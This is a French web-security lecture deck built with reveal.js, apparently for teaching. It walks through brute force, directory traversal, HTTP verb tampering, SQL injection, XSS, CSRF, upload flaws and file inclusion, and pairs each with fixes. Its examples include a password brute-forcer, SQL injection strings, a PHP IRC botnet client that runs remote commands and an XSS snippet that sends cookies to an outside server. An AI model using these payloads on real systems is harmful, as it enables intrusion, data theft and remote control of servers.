@@ -1,0 +1,765 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+
+	<title>reveal.js - The HTML Presentation Framework</title>
+
+	<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
+	<meta name="author" content="black reaven">
+
+	<meta name="apple-mobile-web-app-capable" content="yes" />
+	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+	<link rel="stylesheet" href="css/reveal.min.css">
+	<link rel="stylesheet" href="css/theme/blood.css" id="theme">
+
+	<!-- For syntax highlighting -->
+	<link rel="stylesheet" href="lib/css/tomorrow-night-eighties.css">
+
+	<!-- If the query includes 'print-pdf', use the PDF print sheet -->
+	<script>
+		document.write( '<link rel="stylesheet" href="css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );
+	</script>
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+				<section data-background="images/home_hacker.jpg" >
+					<h1>Sécurité</h1>
+					<h3>Des applications web</h3>
+					<p>
+						<small>Created by <a href="#">Thomas PERRIN</a></small>
+					</p>
+					
+				</section>
+
+				<section data-background="images/home_hacker.jpg" data-transition="zoom" data-background-transition="slides">
+					<section>
+						<h2>Sécurité ?</h2>
+						<p>
+							<ol>
+								<li class="fragment">Définition</li>
+								<li class="fragment">Les bases de la securisation</li>
+								<li class="fragment">Comment se déroule une attaque ?</li>
+							</ol>
+							<img class="fragment" src="http://media.tumblr.com/b66213f2bb3e7ecb51a4152c12d3d1d2/tumblr_inline_mgkr9q3xHc1r8oot9.gif" alt="">
+						</p>
+					</section>
+					<section>
+						<h2>Définition</h2>
+						<p>Les principes de la sécurité des application sont l'ensemble des propriétés, des comportements, des conceptions et des pratiques de mise en œuvre qui visent à réduire la probabilité du succés d'une attaque et l'impact de celle-ci . Les principe de sécurité sont indépendants du language et de l'architecture, et peuvent être utilisé dans la plupart des méthodologies de développement de logiciels pour concevoir et construire des applications sécurisé.</p>
+						<a href="https://www.owasp.org/index.php/Category:Principle">owasp</a>
+					</section>
+					<section>
+						<h2>Les principes de bases</h2>
+						<p>
+							<ol>
+								<li class="fragment">Sécurisation à tous les niveaux de l'application</li>
+								<li class="fragment">Minimiser les points d'entrée d'une attaque</li>
+								<li class="fragment">Minimiser l'impact des erreurs</li>
+								<li class="fragment">Executer avec le minimum de droit</li>
+								<li class="fragment">Garder un systeme de sécurité le plus simple possible</li>
+								<li class="fragment">Détecter les intrusion(mettre suffisament de log)</li>
+								<li class="fragment">Ne jamais faire confiance à l'infrastructure</li>
+								<li class="fragment">Ne pas faire confiance au utilisateur</li>
+							</ol>
+						</p>
+					</section>
+					<section>
+						<h2>Comment se déroule une attaque ?</h2>
+						<p>
+							<h3>Détection</h3>
+							Un attaquant va chercher à récupéré des informations utiles sur sa cible(application et système). 
+							<ul>
+								<li>Framework</li>
+								<li>CMS</li>
+								<li>OS du serveur</li>
+								<li>Url pouvant offrir un point d'entrée</li>
+							</ul>
+						</p>
+						<aside class="notes">
+    						<ul>
+    							<li>
+    								Recherche google
+    								<ul>
+    									<li>inurl:?id=</li>
+    									<li>inurl:robot.txt</li>
+    								</ul>
+    							</li>
+    							<li>
+    								identification des url des cms
+    								<ul>
+    									<li>Drupal /user ou ?q=user</li>
+    									<li>Ezpublish /administration</li>
+    									<li>Wordpress /wp-admin</li>
+    								</ul>					
+    							</li>
+    							<li>
+    								Provoquer des erreur pour identifier le serveur
+    								TODO trouver des image d'erreur nginx / apache 
+    							</li>
+    						</ul>
+    					</aside>
+					</section>
+					<section>
+						<h2>Google est votre ami... </h2>
+						<h3>...Mais aussi celui des hacker</h3>
+						<p>
+							Google comporte des easter eggs qui sont devenus des filtres trés utiles pour repérer des sites vulnerable.
+							
+							<a href="http://www.googleguide.com/advanced_operators_reference.html">http://www.googleguide.com/advanced_operators_reference.html</a>
+						</p>
+					</section>
+					<section>
+						<h2>Comment se déroule une attaque ?</h2>
+
+						<h3>Test des attaque</h3>
+						<p>
+							L'attaquant test les point d'entrée potentiel qu'il a trouvé.
+						</p>
+					</section>
+					<section>
+						<h2>Comment se déroule une attaque ?</h2>
+
+						<h3>Exploitation des failles</h3>
+						<p>
+							<ul>
+								<li>Prise de controle de l'infrastructure</li>
+								<li>Vol de données</li>
+								<li>Modification de donnée</li>
+								<li>Mise hors service de l'application ou du système</li>
+							</ul>
+						</p>
+					</section>
+				</section>
+
+				<!-- Example of nested vertical slides -->
+				<section>
+					<h2>Les attaques</h2>
+					<p>
+						<ol>
+							<li>Brute force</li>
+							<li>Taversal directory</li>
+							<li>Authentification HTTP</li>
+							<li >Injections
+								<ul>
+									<li>Injection sql</li>
+									<li>Injection de code PHP</li>
+									<li>XSS - Cross site scripting</li>
+									<li>CSRF - Cross site request forgery</li>
+								</ul>
+							</li>
+							<li >Upload / RFI / LFI</li>
+						</ol>
+					</p>
+				</section>
+
+				<section>
+					<section>
+						<h2>Brute force</h2>
+						<p>
+							Le but d'un brute forcing est de trouver les parametre de connexion en testant toutes les possibilté.
+						</p>
+						<img src="http://www.reactiongifs.com/wp-content/uploads/2013/12/hulksmash.gif" alt="">
+					</section>
+					<section>
+						<h2>Brute force - Exemple</h2>
+						<p>Voici un simple code generant des mot de passe et les testant sur l'acces à l'administration d'un site vulerable.</p>
+						<pre><code data-trim contenteditable class='ruby' ><![CDATA[
+@agent = Mechanize.new
+
+url = "http://vulnerable/admin"
+login_action = '/admin'
+login = 'admin'
+pass = ""
+?a.upto('zzzzz') do |x|
+  @agent.get url do |page|
+    page.forms.each do |form|
+      if form.action == login_action
+        form['_username'] = login;
+        form['_password'] = x;
+        page = form.submit
+        if(not page.body.to_s.index('incorrect'))
+          p "Password found : "<<x
+          exit()
+        end
+      end
+    end
+  end
+end]]></code></pre>
+					</section>
+					<section>
+						<h2>Brute force - Améliorations</h2>
+						<p>
+							<ul>
+								<li>Attaque par dictionnaire</li>
+								<li>Optimisation de la génération</li>
+								<li>Accroissement de la puissance de calcul(supercalculateur, calcul distribué ou botnet)</li>
+							</ul>
+						</p>
+					</section>
+					<section>
+						<h2>Brute force - Solution</h2>
+						<p>
+							<ul>
+								<li>Utilisation de mot de passe robustes</li>
+								<li>Randomisation des mot de passe</li>
+								<li>Eviter de donné trop d'information dans les messages d'erreur</li>
+								<li>Augmenter le temps à chaque tentative (timeur, captcha, etc..)</li>
+								<li>Limiter le nombre de tentative possible</li>
+								<li>Renouvellement des mots de passes</li>
+							</ul>
+						</p>
+					</section>
+				</section>
+
+				<section>
+					<section>
+						<h2>Traversal directory</h2>
+						<p>
+							Le but du traversal directory est de récupéré le lien vers des répertoires ou des fichiers non protégé.
+						</p>
+					</section>
+					<section>
+						<h2>Traversal directory - Exemple</h2>
+						<p>Ici l'attaquant va essayer de trouver la page d'administration</p>
+						<pre><code data-trim contenteditable>
+						http://exemple.com
+http://exemple.com/admin
+http://exemple.com/administration
+http://exemple.com/wp-admin
+						</code></pre>
+						<p>Ici l'attaquant va essayer de trouver le répertoire d'upload des documents</p>
+						<pre><code data-trim contenteditable>
+						http://exemple.com/media
+http://exemple.com/pdf
+http://exemple.com/document
+http://exemple.com/upload
+						</code></pre>
+					</section>
+					<section>
+						<h2>Traversal directory - Solution</h2>
+						<p>
+							<ul>
+								<li>Ajouter un index.php/.html dans les répertoire</li>
+								<li>
+									Protéger avec un .htaccess
+									<ul>
+										<li>Faire une redirection vers l'index</li>
+									</ul>
+								</li>
+							</ul>
+						</p>
+					</section>
+				</section>
+				<section>
+					<section>
+						<h2>Authentification HTTP</h2>
+						<p>
+							Le protocole HTTP fourni un moyen de gérer une authentification et de restreindre l'acces à une ressources.
+							Il existe deux méthod de gérer cette authentification : 
+							<ul>
+								<li>HTTP Basic Auth</li>
+								<li>HTTP Digest Auth</li>
+							</ul>
+						</p>
+						<aside class="note">
+							
+						</aside>
+					</section>
+					<section>
+						<h2>HTTP Basic Auth</h2>
+						<p>
+							Si le serveur ne reçoit pas dans l'entête HTTP l'identification correcte voici le genre de header envoyé :
+						</p>
+						<pre><code>WWW-Authenticate: Basic realm="Secured Access"</code></pre>
+						<p>
+							Et voici le genre de header d'identification qui sera attendu:
+						</p>
+						<pre><code>Authorization: Basic YWRtaW46YWRtaW4=</code></pre>
+						<p>
+							
+						</p>
+						<pre><code class="php">'YWRtaW46YWRtaW4=' == base64_encode('admin:admin')</code></pre>
+					</section>
+					<section>
+						<h2>HTTP Verb</h2>
+						<p>
+							Les verbes HTTP sont les methodes utilisé pour indiquer l'action desiré.
+							<ul>
+								<li><strong>GET</strong> : Demande d'une ressources comme une page web en fonction d'une url</li>
+								<li><strong>POST</strong> : Demande d'unressource avec des donnée encapsuler dans la requête</li>
+								<li><strong>PUT</strong> : Demande d'enregistrement de données encapsulés dans la requête</li>
+								<li><strong>DELETE</strong> : Demande de suppression d'une ressource sur le serveur</li>
+								<li><strong>HEAD</strong> : Demande des headers</li>
+								<!-- <li><strong>TRACE</strong> : Permet de tracer les requête recu par le serveur</li>
+								<li><strong>OPTIONS</strong> :  Demande des methodes supporter par le serveur</li>
+								<li><strong>CONNECT</strong> :  Convertis la request en tunnel tcp/ip</li>
+								<li><strong>PATCH</strong> : Demande de modification partiel d'une ressource sur le serveur</li> -->
+							</ul>
+						</p>
+						<aside class="note">
+							<ul>
+								<li><strong>GET</strong> : Demande d'une ressources comme une page web en fonction d'une url</li>
+								<li><strong>POST</strong> : Demande d'unressource avec des donnée encapsuler dans la requête</li>
+								<li><strong>PUT</strong> : Demande d'enregistrement de données encapsulés dans la requête</li>
+								<li><strong>DELETE</strong> : Demande de suppression d'une ressource sur le serveur</li>
+								<li><strong>HEAD</strong> : Demande des headers</li>
+								<li><strong>TRACE</strong> : Permet de tracer les requête recu par le serveur</li>
+								<li><strong>OPTIONS</strong> :  Demande des methodes supporter par le serveur</li>
+								<li><strong>CONNECT</strong> :  Convertis la request en tunnel tcp/ip</li>
+								<li><strong>PATCH</strong> : Demande de modification partiel d'une ressource sur le serveur</li>
+							</ul>
+						</aside>
+					</section>
+					<section>
+						<h2>HTTP verb Tampering</h2>
+						<p>
+							Cette attaque permet de by-passer une authentification http basique si les .htaccess et le serveur ont été mal paramétrés.
+							
+						</p>
+					</section>
+
+					<section>
+						<h2>HTTP verb Tampering - Exemple</h2>
+						<p>
+						Voici un fichier .htaccess faillible : 
+						<pre>
+						<code data-trim>
+AuthName “restrict access”
+AuthType Basic
+AuthUserFile .htpasswd
+< Limit GET POST >
+require group staff
+< /Limit >
+						</code>
+						</pre>
+						Ici on limite l'accés en GET et POST à une ressource via une authentification. Mais que ce passe-t-il si on demande la page avec une autre methode HTTP ?
+						</p>
+
+						</section>
+						<section>
+						<h2>HTTP verb Tampering - Exemple</h2>
+						<p>
+						<pre><code data-trim>
+PUT /admin/secured HTTP/1.1
+Host: www.target.org
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Cache-Control: max-age=0
+						</code></pre>
+						</p>
+					</section>
+				</section>
+				<section data-background="images/home_hacker.jpg">
+					<section>
+						<h2>Injections</h2>
+						<p>
+							Le but des injections va être de faire executé de code source au serveur ou au navigateur de la victime. Il en existe plusieurs type.
+							<ol>
+								<li class="fragment">Injection sql</li>
+								<li class="fragment">Injection de code applicatif
+									<ul>
+										<li>Injection de code client (HTML/CSS/Javascript)</li>
+										<li>Injection de code serveur (PHP/Java/.Net/XML/Json/LDAP/...)</li>
+									</ul>
+								</li>
+							</ol>
+						</p>
+					</section>
+				</section>
+				<section>
+					<section>
+						<h2>Injections sql</h2>
+						
+						<p>
+							Le but d'une injection SQL est de faire executer une requete sql au serveur afin de modifier son comportement.
+						</p>
+
+
+					</section>
+					<section>
+						<h2>Injections sql - Exemple 1</h2>
+						
+						<p>
+							L'attaquant va essayer de passé l'interface d'admin en injectant du code SQL dans le password afin de cour circuiter la verification de la validité du mot de passe.
+							<pre><code data-trim class="php">
+$query = $pdo->prepare("select * from FROM users WHERE username='$username' AND password='$password'");
+$user = $query->execute();
+							</code></pre>
+							La requete executé est donc :
+							<pre><code data-trim class="sql">SELECT * from FROM users WHERE username='admin' AND password='admin'</code></pre>
+
+							Maintenant si a la place de <code data-trim class="php">$password</code> l'utilisateur(ou plutôt le vilain hacker) met :
+							<pre><code data-trim class="php">' OR '1'='1</code></pre>
+							<pre><code data-trim class="sql">SELECT * from FROM users WHERE username='admin' OR '1'='1' AND password='' </code></pre>
+							<pre><code data-trim class="sql">' OR 1=1"); DROP TABLE users; </code></pre>
+							<pre><code data-trim class="sql">'; shutdown with nowait; -- </code></pre>
+						</p>
+
+
+					</section>
+					<section>
+					<h2>Injections sql - Exemple 2</h2>
+						
+						<p>
+							La requête : 
+							<pre><code data-trim class="sql">SELECT email from FROM users where username='$username'</code></pre>
+
+							Maintenant si a la place de <code data-trim class="php">$username</code> l'attaquant' met :
+							<pre><code data-trim class="sql">' UNION SELECT password FROM users WHERE id=1</code></pre>
+							<pre><code data-trim class="sql">SELECT email from FROM users WHERE username='' UNION SELECT password FROM users WHERE id=1</code></pre>
+						</p>
+					</section>
+					<section>
+						<h2>Injections sql - Le but</h2>
+						<p>
+							<ul>
+								<li>accéder à des données auxquelles on ne devrait pas avoir accès,</li>
+								<li>modifier des données,</li>
+								<li>effacer des données,</li>
+								<li>lire/écrire sur le système de fichier,</li>
+								<li>exécuter des commandes systèmes.</li>
+							</ul>
+							<a href="http://www.cgsecurity.org/Articles/sql_injection/">http://www.cgsecurity.org/Articles/sql_injection/</a>
+							<a href="https://www.owasp.org/index.php/Blind_SQL_Injection">https://www.owasp.org/index.php/Blind_SQL_Injection</a>
+						</p>
+					</section>
+					<section>
+						<h2>Injections sql - Solutions</h2>
+						<p>
+							<ul>
+								<li>Ne pas afficher les erreurs mysql</li>
+								<li>Échappement des caractères spéciaux
+									<ul>
+										<li>$mysqli->real_escape_string() depuis PHP 5.5</li>
+										<li>mysqli_escape_string() pour les versions antérieurs</li>
+									</ul>
+								</li>
+								<li>Utilisation d'une requête préparée</li>
+								<li>Utiliser des comptes utilisateurs SQL à accès limité (en lecture-seule) quand cela est possible.</li>
+							</ul>
+						</p>
+					</section>
+				</section>
+				<section>
+					<section>
+						<h2>Injection PHP</h2>
+						<p>
+							Le but de l'injection de code applicatif va être de modifier le comportement de l'application coté serveur.
+						</p>
+					</section>
+					<section>
+						<h2>Injection PHP- Register global</h2>
+						<p>
+							La faille de sécurité "Register global" viens d'une configuration de php <a href="http://php.net/manual/fr/security.globals.php">register_globals</a> qui si elle est activé peut facilité la création de faille. 
+							Si le register_globals a la valeur 'On' alors toutes les variables $_GET, $_POST, $_SERVER sont diponible sous la forme de variable PHP.
+
+							<pre><code data-trim class="php">
+// $username est injecté par php directement si register_globals = On
+$username    == $_POST['username']
+$username    == $_GET['username']
+$username    == $_SESSION['username']
+$httpReferer == $_SERVER['HTTP_REFERER']
+							</code></pre>
+						</p>
+						<aside class="note">
+							PHP 5.3 obsolète
+							PHP 5.4 supprimé
+						</aside>
+					</section>
+					<section>
+						<h2>Register global - Exemple</h2>
+						<p>
+							<pre><code data-trim class="php">
+if($logged){
+	// display admin information
+}
+							</code></pre>
+							<pre><code data-trim class="php">
+								http://example.com/admin?logged=1
+							</code></pre>
+						</p>
+					</section>
+					<section>
+						<h2>Register global - Solution</h2>
+						<p>
+							<ul>
+								<li>Faire attention au variable que l'on utilise</li>
+								<li>Désactivé les register_globals dans la config de php</li>
+							</ul>
+						</p>
+					</section>
+					<section>
+						<h2>Injection PHP</h2>
+						
+						<p>
+							Certain site permettent au utilisateur de contribué directement du code php. (ex: Drupal)
+ 							<pre><code data-trim class="php">
+set_time_limit(0);
+$socket = fsockopen('irc.epiknet.org','6667');
+
+if(!$socket)
+{
+	echo 'Impossible de se connecter';
+	exit;
+}
+fputs($socket,"USER PwnBot PwnBot PwnBot PwnBot\r\n");
+fputs($socket,"NICK PwnBot\r\n");
+fputs($socket,"JOIN #botnet_chan\r\n");
+
+$continuer = 1;
+while($continuer)
+{
+	$donnees = fgets($socket, 1024);
+	$retour = explode(':',$donnees); // On sépare les différentes données.
+	// On regarde si c'est un PING, et, le cas échéant, on envoie notre PONG :
+	if(rtrim($retour[0]) == 'PING')
+	{
+		fputs($socket,'PONG :'.$retour[1]);
+	}
+	if($rtrim($retour[0]) == 'PRIVMSG')
+		exec($retour[3]);
+}
+							</code></pre>
+						</p>
+					</section>
+				</section>
+				<section>
+					<section>
+						<h2>XSS - Cross site scripting</h2>
+						<p>
+							XSS où « Cross-Site Scripting » est l’une des failles les plus répandues dans les sites Web dynamiques. Elle fait partie de la famille des attaques par injection.
+						</p>
+						<p>
+							Le but de cette attaque est d’effectuer un certain nombre d’actions dans le navigateur de la victime.
+						</p>
+						<p>
+							Les risques sont multiples :
+							<ul>
+								<li>Défacement</li>
+								<li>Redirection</li>
+								<li>Vol de données</li>
+							</ul>
+						</p>
+					</section>
+					<section>
+						<h2>Injection XSS</h2>
+						<p>Défacement</p>
+						<pre><code data-trim class="html">
+&lt;script type="text/javascript"&gt;
+	msg = "Vous êtes victime d’une attaque XSS !";
+	document.write(msg);
+&lt;/script&gt;
+						</code></pre>
+						<p>Redirection</p>
+						<pre><code data-trim class="html">
+&lt;script type="text/javascript"&gt;
+	document.location = "http://www.serveur-distant.net/page-piege.php";
+&lt;/script&gt;
+						</code></pre>
+						<p>Vol de cookie</p>
+						<pre><code data-trim class="html">
+&lt;script type="text/javascript"&gt;
+	var addr = “http://www.serveur-distant.net/page-piege.php?cookie=” + document.cookie;
+	var imgTag = document.createElement("img");
+	imgTag.setAttribute("src",addr);
+	document.body.appendChild(imgTag);
+&lt;/script&gt;
+						</code></pre>
+					</section>
+					<section>
+						<h2>Injection XSS - Solution</h2>
+						<p>
+							<ul>
+								<li>
+									Supprimer les balises html des données venant des utilisateur mais aussi de la base de donnée
+									<ul>
+										<li>htmlspecialchars()</li>
+										<li>htmlentities()</li>
+										<li>strip_tags()</li>
+									</ul>
+								</li>
+							</ul>
+						</p>
+					</section>
+					<section>
+						<h2>Injection CSRF - Cross Site request forgery</h2>
+						
+						<p>
+							L'approche est la même que les XSS mais le but est différent il s'agit de faire executé une requete à une victime.
+							<pre><code data-trim class="html">
+								<img src="/post/2/delete" />
+							</code></pre>
+						</p>
+					</section>
+					<section>
+						<h2>Inject CSRF - Solutions</h2>
+						<p>
+							Utilisation de token csrf pour eviter que des requête puisssent etre rejouer.
+						</p>
+					</section>
+				</section>
+
+				<section>
+					<h2>Les faille Upload/LFI/RFI</h2>
+					<p>
+						Ces failles sont du a des faille dans les script d'upload ou dans l'inclusions de fichier sans contrôle dans une page.
+					</p>
+				</section>
+
+				<section>
+					<section>
+						<h2>Faille upload</h2>
+						<p>
+							La faille upload permet a un attaquant d'uploader un fihcier sur le serveur qui va contenir du code malveillant.
+
+							L'objectif est de corrompre le serveur grâce à des trojan, worm, et autre malware.
+						</p>
+					</section>
+					<section>
+						<h2>Faille upload - Basic</h2>
+						<p>
+							<pre><code data-trim class="php">
+$resultat = move_uploaded_file($_FILES['avatar']['tmp_name'],'files/'.$_FILES['avatar']['name']);
+if ($resultat) echo "Transfert réussi";
+							</code></pre>
+							Ici aucun contrôle sur le fichier uploader donc n'importe quel fichier pourrait être uploader sur le serveur(Un fichier php par exemple).
+						</p>
+					</section>
+
+					<section>
+						<h2>Faille upload - Null byte</h2>
+						<p>
+							<pre><code class="php">
+$extensions_valides = array( 'jpg' , 'jpeg' , 'gif' , 'png' );
+//1. strrchr renvoie l'extension avec le point (« . »).
+//2. substr(chaine,1) ignore le premier caractère de chaine.
+//3. strtolower met l'extension en minuscules.
+$extension_upload = strtolower(  substr(  strrchr($_FILES['avatar']['name'], '.')  ,1)  );
+if ( in_array($extension_upload,$extensions_valides) ) echo "Extension correcte";
+							</code></pre>
+							Ici on verifie l'extension du fichier uploader. <br /><br />
+							Les Null byte sont des caractère avec la valeur zéro qui en principe marque la fin d'une chaine de caractere. si un attaquant voulais uploader quand même un fichier php il lui suffirait de renomer son fichier :
+							<pre><code>c99.php%00.png</code></pre>
+						</p>
+					</section>
+					<section>
+						<h2>Faille upload - Spoofing mime-type</h2>
+						<p>
+							Certain site vont verifier le mime type, le type de fichier uploader. 
+							Exaemple de données envoyées en POST lors d'un upload : 
+							<pre><code>-----------------------------312964014798731795365001168\r\n
+Content-Disposition: form-data; name="file"; filename="test.php"\r\n
+Content-Type: text/php\r\n\r\n<?php\necho 'powned';\n?>\r\n
+-----------------------------312964014798731795365001168--\r\n</code></pre>
+							Pour modifier le type de fichier il suffit de modifier :
+							<pre><code>-----------------------------312964014798731795365001168\r\n
+Content-Disposition: form-data; name="file"; filename="test.php"\r\n
+Content-Type: image/jpeg\r\n\r\n<?php\necho 'powned';\n?>\r\n
+-----------------------------312964014798731795365001168--\r\n</code></pre>
+						</p>
+					</section>
+					<section>
+						<h2>Faille upload - Solutions</h2>
+						<p>
+							<ul>
+								<li>Ne jamais se fier à ce que peut envoyer le client.</li>
+								<li>Vérifier la configuration d’Apache afin d’agir en conséquence.</li>
+								<li>Ne pas placer le .htaccess dans le répertoire d’upload</li>
+								<li>Ne pas permettre l’écrasement de fichier</li>
+								<li>Générer un nom aléatoire pour le fichier uploadé et enregistrer le nom dans une base de données.</li>
+								<li>Ne pas permettre de voir l’index of du répertoire d’upload.</li>
+								<li>Assigner les bonnes permissions au répertoire.</li>
+								<li>Vérifier le mime-type avec getimagesize() et l’extension du fichier.</li>
+							</ul>
+						</p>
+					</section>
+				</section>
+
+				<section>
+					<section>
+						<h2>Faille LFI/RFI</h2>
+						<p>
+							Les faille lfi/rfi viennent d'un appel à la fonction php <code class="php">include</code> non sécurisé qui permet d'inclure soit à des fichiers locaux(LFI - Local file include), ou d'injecter un script php distant(RFI - Remote file include)
+						</p>
+					</section>
+
+					<section>
+						<h2>Faille include</h2>
+						<pre><code class="php">$incfile = $_REQUEST["file"];
+include($incfile.".php");</code></pre>
+						<p>
+							
+						</p>
+					</section>
+				</section>
+				<section>
+					<h2>La boite à outils</h2>
+					<p>
+						<ul>
+							<li><a href="https://code.google.com/p/patator/">Patator brute-forcer</a></li>
+							<li><a href="http://dotdotpwn.sectester.net/">dotdotpwn - Directory Traversal Fuzzer</a></li>
+							<li><a href="http://sqlmap.org/">SQLMap</a></li>
+							<li><a href="https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project">SQLiX</a></li>
+							<li><a href=""></a>Tamper Data</li>
+							<li><a href="">fimap</a></li>
+						</ul>
+					</p>
+				</section>
+				<section>
+					<h1>Questions ?</h1>
+				</section>
+
+			</div>
+
+	</div>
+
+	<script src="lib/js/head.min.js"></script>
+	<script src="js/reveal.min.js"></script>
+
+	<script>
+
+				// Full list of configuration options available here:
+				// https://github.com/hakimel/reveal.js#configuration
+				Reveal.initialize({
+					controls: true,
+					progress: true,
+					history: true,
+					center: true,
+
+					theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+					transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none
+
+					// Parallax scrolling
+					// parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
+					// parallaxBackgroundSize: '2100px 900px',
+
+					// Optional libraries used to extend on reveal.js
+					dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+					]
+				});
+
+	</script>
+
+</body>
+</html>
